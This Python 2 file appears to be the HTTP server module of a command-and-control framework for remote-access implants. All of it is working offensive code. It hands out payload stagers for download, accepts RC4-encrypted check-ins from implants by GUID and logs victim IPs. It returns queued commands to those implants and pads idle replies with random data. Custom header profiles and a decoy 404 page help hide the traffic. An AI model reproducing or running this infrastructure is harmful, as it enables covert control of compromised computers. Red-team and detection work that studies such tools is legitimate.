#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/httpd.py
"""

import BaseHTTPServer
import base64
import ssl
import json
import threading
import random
from core.log import Log
from core.ui import UI
from core.rc4 import RC4
from core.parser import HTTPDParser
from core.utils import Utils
from core.apis import ServerApi
from core.payload import Payload


def HTTPDFactory(config):

    class HTTPD(BaseHTTPServer.BaseHTTPRequestHandler, object):

        def __init__(self, *args, **kwargs):
            self.config = config
            self.server_version = self.config.get('http-server')
            self.sys_version = ''
            self.rc4 = RC4(self.config.get('encryption-key'))
            self.db = self.config.get('redis')
            self.output = ''

            super(HTTPD, self).__init__(*args, **kwargs)

        def set_http_headers(self, force_download=False, filename=None):
            self.send_response(200)
            self.set_custom_headers()
            if force_download:
                self.send_header('Content-Type','application/octet-stream')
                if filename == None:
                    self.path.rsplit('/', 1)[1]
                if filename:
                    self.send_header('Content-Disposition','attachment; filename="%s"' % filename)
            else:
                self.send_header('Content-Type', 'text/html')
            self.end_headers()

        def set_json_header(self):
            self.send_response(200)
            self.set_custom_headers()
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

        def set_custom_headers(self):
            profile = self.config.get('profile')
            if not profile == '':
                for item in profile.get('headers'):
                    self.send_header(item,
                            Utils.parse_random(profile.get('headers'
                            )[item]))

        def do_POST(self):
            if self.path.split('/')[1] == 'api':
                server_api = ServerApi(self.config, self)
                self.output = server_api.process()
                self.return_json()
                return

            length = 0
            if not self.headers.getheader('Content-Length') == None:
                length = int(self.headers.getheader('Content-Length'))

            data = self.rfile.read(length)
            try:
                data = json.loads(data)
                data['Data'] = self.rc4.crypt(base64.b64decode(data['Data']))
            except:
                Log.log_error('Invalid base64 data received or bad decryption', self.path)
                self.return_data()
                return

            guid = ''
            try:
                guid = Utils.validate_guid(data['ID'])
            except:
                Log.log_error('Invalid request no GUID', self.path)
                self.return_data()
                return

            if not guid == None:
                self.db.update_checkin(guid, str(self.client_address[0]))

                parser = HTTPDParser(config)
                output = parser.parse_cmd(guid, data['Data'],
                        data['UUID'])
                if not output == None:
                    uuid = output[:36]
                    output = output[37:]
                    self.output = \
                        base64.b64encode(self.rc4.crypt(output))
                    self.output = json.dumps({'UUID': uuid, 'ID': guid, 'Data': self.output})
                else:
                    self.output = json.dumps({'UUID': None, 'ID': guid,'Data': Utils.gen_str(random.randrange(10,1000))})
                self.return_json()
                return
            else:
                self.output = Utils.load_file('html/%s' % self.config.get('http-default-404'))

            self.return_data()

        def do_GET(self):
            force_download = False
            if self.path.split('/')[1] == 'api':
                server_api = ServerApi(self.config, self)
                self.output = server_api.process()
                self.return_json()
                return

            path = self.path.split('/')[-1]
            payload_path = self.path.split('/')
            filename = Utils.gen_str(12)
            if payload_path[1] == self.config.get('http-download-path'):
                filename = Utils.gen_str(12)
                force_download = True
                Log.log_event('Download Stager', 'Stager was fetched from %s (%s)' % (self.client_address[0], self.address_string()))
                payload = Payload(self.config)

                if len(payload_path) > 3:
                    payload.set_type(payload_path[2])

                if len(payload_path) > 4:
                    payload.set_delay(payload_path[3])
                self.output = payload.get_output()
            elif path in Utils.get_download_folder_content():
                force_download = True
                self.output = Utils.load_file('download/%s' % path)
                Log.log_event('Download File','%s was downloaded from %s (%s)' % (path, self.client_address[0], self.address_string()))
            else:
                self.output = Utils.load_file('html/%s' % self.config.get('http-default-404'))
                Log.log_error('Invalid request got a GET request', self.path)
            self.return_data(force_download, filename)

        def do_OPTIONS(self):
            self.send_response(200, 'OK')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods','GET, POST, OPTIONS')
            self.send_header('Access-Control-Allow-Headers','X-Requested-With, Content-Type, Authorization')
            self.output = 'OK'
            self.return_json()

        def return_data(self, force_download=False, filename=None):
            self.set_http_headers(force_download, filename)
            self.wfile.write(self.output)

        def return_json(self):
            self.set_json_header()
            self.wfile.write(self.output)

        def log_message(self, format, *args):
            Log.log_http_request(self.client_address[0], self.address_string(), args[0])
            return

    return HTTPD


def init_httpd_thread(config):
    thread = threading.Thread(target=start_httpd, args=(config, ))
    thread.start()
    return thread


def start_httpd(config):
    ip = config.get('http-host')
    port = int(config.get('http-port'))

    print '\r\n'
    UI.success('Starting web server on %s port %d' % (ip, port))
    try:
        server_class = BaseHTTPServer.HTTPServer
        factory = HTTPDFactory(config)
        httpd_server = server_class((ip, port), factory)
        if config.get('https-enabled') == 'on':
            cert = config.get('https-cert-path')
            Utils.file_exists(cert, True)

            httpd_server.socket = ssl.wrap_socket(httpd_server.socket, certfile=cert)
            UI.success('Web server is using HTTPS')

        httpd_server.serve_forever()
    except:
        UI.error('Server was not able to start (Port already in use?)... Aborting', True)
